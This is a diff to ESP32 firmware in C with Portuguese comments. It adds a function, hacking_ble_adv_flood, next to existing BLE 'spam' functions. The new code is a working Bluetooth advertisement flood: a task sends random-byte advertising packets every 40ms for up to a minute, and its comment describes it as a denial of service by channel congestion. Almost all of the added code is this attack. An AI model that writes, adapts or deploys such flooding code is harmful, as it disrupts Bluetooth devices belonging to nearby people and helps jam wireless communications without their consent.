@@ -7,6 +7,7 @@
 
 #include "esp_log.h"
 #include "esp_random.h"
+#include "esp_timer.h"
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
 
@@ -66,6 +67,7 @@ static const uint8_t google_models[GOOGLE_NUM_MODELS][3] = {
 // Estado compartilhado
 // ----------------------------------------------------------------------
 static volatile bool s_busy = false;
+static volatile bool s_busy_break = false;  // sinal pra interromper flood antes do deadline
 static TaskHandle_t s_task = NULL;
 static uint8_t s_seq = 0;
 
@@ -285,4 +287,93 @@ esp_err_t hacking_ble_google_spam(uint16_t cycles)
 esp_err_t hacking_ble_multi_spam(uint16_t cycles)
 {
     return spam_dispatch(cycles, BLE_SPAM_VENDOR_MULTI);
+}
+
+// ----------------------------------------------------------------------
+// BLE adv flood — DoS por congestion
+// ----------------------------------------------------------------------
+
+#define FLOOD_CYCLE_MS   40   // ~25 advs/sec por canal × 3 canais ≈ 75 PDUs/sec
+
+static void emit_flood_done(uint16_t sent, uint16_t duration_sec)
+{
+    uint8_t payload[4];
+    payload[0] = (uint8_t)(sent >> 8);
+    payload[1] = (uint8_t)(sent & 0xFF);
+    payload[2] = (uint8_t)(duration_sec >> 8);
+    payload[3] = (uint8_t)(duration_sec & 0xFF);
+
+    uint8_t frame[TLV_MAX_FRAME_SIZE];
+    int total = tlv_encode(frame, sizeof(frame),
+                           TLV_MSG_BLE_FLOOD_DONE, s_seq++,
+                           payload, sizeof(payload));
+    if (total > 0) transport_ble_send_stream(frame, (size_t)total);
+}
+
+static void flood_task(void *arg)
+{
+    uint16_t duration_sec = (uint16_t)(uintptr_t)arg;
+    int64_t deadline = esp_timer_get_time() + (int64_t)duration_sec * 1000000LL;
+
+    ble_gap_adv_stop();
+
+    uint16_t sent = 0;
+    while (!s_busy_break && esp_timer_get_time() < deadline) {
+        uint8_t adv[31];
+        // Random bytes formando "adv data" cru. Não é um adv válido
+        // estruturado; alguns scanners podem ignorar — o ponto é o canal,
+        // não o conteúdo.
+        for (int i = 0; i < 31; i++) {
+            adv[i] = (uint8_t)(esp_random() & 0xFF);
+        }
+        // Garante o primeiro byte (length do 1º IE) plausível pra não
+        // causar rejeição no controller: tamanho 0x02..0x1D.
+        adv[0] = 2 + (esp_random() % 28);
+        if (adv[0] >= 31) adv[0] = 30;
+        adv[1] = (uint8_t)(esp_random() & 0xFF); // type random
+
+        ble_gap_adv_stop();
+        int rc = ble_gap_adv_set_data(adv, 31);
+        if (rc != 0) { vTaskDelay(pdMS_TO_TICKS(FLOOD_CYCLE_MS)); continue; }
+
+        struct ble_gap_adv_params params = {0};
+        params.conn_mode = BLE_GAP_CONN_MODE_NON;
+        params.disc_mode = BLE_GAP_DISC_MODE_NON;
+        params.itvl_min = 0x20;  // 20ms (BLE units = 0.625ms)
+        params.itvl_max = 0x20;
+
+        rc = ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER,
+                               &params, spam_event_cb, NULL);
+        if (rc == 0) sent++;
+
+        vTaskDelay(pdMS_TO_TICKS(FLOOD_CYCLE_MS));
+    }
+
+    ble_gap_adv_stop();
+    transport_ble_advertising_resume();
+
+    ESP_LOGI(TAG, "ble adv flood done: %u cycles in %us",
+             (unsigned)sent, (unsigned)duration_sec);
+    emit_flood_done(sent, duration_sec);
+
+    s_task = NULL;
+    s_busy = false;
+    s_busy_break = false;
+    vTaskDelete(NULL);
+}
+
+esp_err_t hacking_ble_adv_flood(uint16_t duration_sec)
+{
+    if (s_busy) return ESP_ERR_INVALID_STATE;
+    if (duration_sec == 0) duration_sec = 10;
+    if (duration_sec > 60) duration_sec = 60; // cap pra não fritar
+
+    s_busy = true;
+    s_busy_break = false;
+    if (xTaskCreate(flood_task, "ble_flood", 4096,
+                    (void *)(uintptr_t)duration_sec, 5, &s_task) != pdPASS) {
+        s_busy = false;
+        return ESP_ERR_NO_MEM;
+    }
+    return ESP_OK;
 }
